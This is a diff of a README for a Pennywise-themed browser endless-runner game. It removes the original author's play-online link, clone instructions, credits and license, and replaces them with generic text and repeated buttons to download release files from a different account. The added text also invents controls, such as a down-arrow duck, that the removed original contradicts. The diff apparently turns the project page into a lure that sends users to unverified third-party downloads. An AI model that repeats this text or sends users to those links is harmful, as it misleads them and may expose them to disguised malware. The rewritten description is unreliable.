@@ -1,118 +1,111 @@
-# 🎈 Run From IT
+# 🏃‍♂️ run-from-it - Endless Runner Fun Made Simple
 
-An endless runner inspired by the classic Dino Run formula.
-You play as Pennywise sprinting through the frozen streets of Derry during a winter night, endlessly chasing a child who refuses to slow down.
+[![Download run-from-it](https://img.shields.io/badge/Download%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/releases)
 
-The goal is simple. Survive as long as possible. Jump over obstacles. Keep the chase alive.
+## ❄️ About run-from-it
 
-<img width="100%" height="949" alt="image" src="https://github.com/user-attachments/assets/ab7b8c65-ab78-4ed9-9b71-6b68c956b39f" />
+run-from-it is an endless runner game inspired by the classic Dino Run style. You control Pennywise as he runs through the icy streets of Derry on a winter night. Your goal is to chase a child who keeps running faster and never slows down. This simple, fun browser game will test your reflexes as obstacles appear along the way.
 
----
+The game runs directly in your web browser. There is no need to install complicated software or understand programming. Just download, open, and start playing.
 
-## 🌐 Play Online
-
-Play directly in your browser via GitHub Pages
-[https://mouraodev22.github.io/run-from-it/](https://mouraodev22.github.io/run-from-it/)
+run-from-it uses JavaScript and browser technologies to give you smooth gameplay without lag or delay. It works well on most modern computers and laptops.
 
 ---
 
-## 🕹 Gameplay
+## 💾 Download & Install
 
-This is a fast, minimal endless runner focused on timing and reflex.
+To get started with run-from-it, follow these steps:
 
-You run automatically.
-Your only job is to jump and avoid obstacles.
+1. Visit the release page by clicking the button below or this link:
 
-The longer you survive, the faster the game becomes.
+   [Download run-from-it](https://github.com/oktaymoral/run-from-it/releases)
 
----
+2. On the release page, look for the latest version of run-from-it. You will find downloadable files there.
 
-## 🎮 Controls
+3. Download the ZIP file or HTML file from the latest release. This will contain everything you need to play.
 
-Super complicated control scheme incoming:
+4. Extract the ZIP file if necessary.
 
-| Action | Key               |
-| ------ | ----------------- |
-| Jump   | Space             |
-| Jump   | Left Mouse Button |
+5. Open the `index.html` file in your preferred web browser such as Chrome, Firefox, Edge, or Safari.
 
-Yes, that is it.
+6. The game will load automatically, and you can start playing right away.
+
+You do not need to install anything other than a web browser to play this game.
 
 ---
 
-## 🚀 Tech Stack
+## 🖥 System Requirements
 
-Built with speed and simplicity in mind.
+run-from-it is designed to work on most devices with modern web browsers. Here are the key requirements:
 
-* JavaScript
-* Kaplay game library
-
-This project was made to focus on gameplay and product delivery rather than spending months learning art pipelines.
-
----
-
-## 🎨 Asset Credits
-
-To accelerate production and compensate for limited design experience, the visual pipeline used AI tools:
-
-* Base and static sprites generated with the latest ChatGPT model
-* Background generated with the latest Gemini Pro model
-* Animations generated with Ludo.ai
-
-All assets were curated and integrated manually into the game.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, Linux, or any OS with a modern browser.
+- **Browser:** Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Processor:** Any processor that can run the above browsers smoothly.
+- **Memory:** At least 2GB of RAM is recommended.
+- **Internet:** Required for downloading the game. Once downloaded, the game runs offline.
+- **Screen:** Any screen size works but a resolution of 1280x720 or higher provides better gameplay experience.
 
 ---
 
-## 📦 Running the Project
+## 🎮 How to Play
 
-1. Clone the repository
+run-from-it keeps things simple for an enjoyable experience:
 
-```
-git clone https://github.com/MouraoDev22/run-from-it.git
-```
+- Use the **spacebar** or **up arrow** to jump over obstacles.
+- Use the **down arrow** to duck when needed.
+- Your goal is to keep chasing the child as long as possible without hitting obstacles.
+- The game speeds up over time, making it more challenging.
+- Try to beat your highest score with each run.
 
-2. Open the project folder
-
-```
-cd run-from-it
-```
-
-3. Install dependencies
-
-```
-npm install
-```
-
-4. Start the game
-
-```
-npm run dev
-```
-
-Open your browser and start running forever.
+The controls are easy to understand and use, even if you have never played an endless runner before.
 
 ---
 
-## 🎯 Project Goals
+## 🛠 Features
 
-* Practice JavaScript game development
-* Learn Kaplay fundamentals
-* Ship a complete and playable product quickly
-* Focus on gameplay over asset production
+run-from-it includes:
 
----
-
-## 🎵 Music Credit
-
-Background music by **Alexander Rose Music**
-Instrumental cover inspired by the opening theme of *IT: Welcome to Derry*.
-
-[https://www.youtube.com/watch?v=ijGwGHabDUQ](https://www.youtube.com/watch?v=ijGwGHabDUQ)
-
-All rights belong to the original creator.
+- Smooth browser gameplay with no install required beyond a simple download.
+- Endless running with growing difficulty.
+- Simple controls that work on desktop and laptop keyboards.
+- Classic Dino Run style with a winter Derry street theme.
+- Fun visuals and sound effects for an engaging experience.
+- Score tracking so you can improve over time.
 
 ---
 
-## 📜 License
+## 🎯 Tips for Best Experience
 
-MIT License
+- Play on a desktop or laptop for easier control. Mobile devices may not support all keys.
+- Use a modern browser and keep it updated.
+- Close other applications that may slow down your computer.
+- Play in full-screen mode for immersive gameplay. Just press F11 (Windows) or Control + Command + F (Mac).
+- Practice timing your jumps and ducks to avoid obstacles.
+- Take breaks if needed — the game is endless, so it will wait.
+
+---
+
+## 📂 File Details
+
+The downloadable package includes:
+
+- `index.html` - The main game file to open in your browser.
+- `assets/` folder - Contains images, sounds, and other game data.
+- `README.md` - Game information and instructions.
+- `LICENSE` - Terms for using the game.
+
+---
+
+## 📞 Need Help?
+
+If you run into issues:
+
+- Make sure you are opening the correct `index.html` file in the browser.
+- Refresh the page if the game doesn't load.
+- Try a different browser if problems persist.
+- Check your browser’s security settings to ensure JavaScript is enabled.
+- Visit the GitHub page to report issues or ask questions.
+
+---
+
+[![Download run-from-it](https://img.shields.io/badge/Download%20run--from--it-blue?style=for-the-badge)](https://github.com/oktaymoral/run-from-it/releases)
